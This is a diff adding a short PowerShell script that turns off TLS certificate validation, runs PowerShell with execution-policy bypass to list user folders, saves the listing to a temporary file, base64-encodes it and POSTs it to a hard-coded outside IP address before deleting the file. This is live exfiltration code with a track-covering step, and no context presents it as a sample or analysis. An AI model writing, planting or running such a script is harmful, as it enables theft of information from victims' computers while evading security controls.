@@ -1,1 +1,21 @@
-
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+New-Item c:\users\public\music\file.txt;
+PowErsHeLl -ep Bypass "ls ../../users" > c:\users\public\music\file.txt;
+$EncodedText = [convert]::ToBase64String((Get-Content -path c:\users\public\music\file.txt -Encoding byte));
+$verb = "POST";
+$addr = "https://46.161.53.115/micr0answer";
+$webRequest = [System.Net.WebRequest]::Create($addr);
+$encodedContent = [System.Text.Encoding]::UTF8.GetBytes($EncodedText);
+$webRequest.Method = $verb;
+$webRequest.ContentLength = $encodedContent.length;
+$requestStream = $webRequest.GetRequestStream();
+$requestStream.Write($encodedContent, 0, $encodedContent.length);
+$requestStream.Close();
+	[System.Net.WebResponse] $resp = $webRequest.GetResponse();
+	if($resp -ne $null) 
+{
+    $rs = $resp.GetResponseStream();
+    [System.IO.StreamReader] $sr = New-Object System.IO.StreamReader -argumentList $rs;
+    [string] $results = $sr.ReadToEnd();
+}else {  exit ''}
+remove-item c:\users\public\music\file.txt;
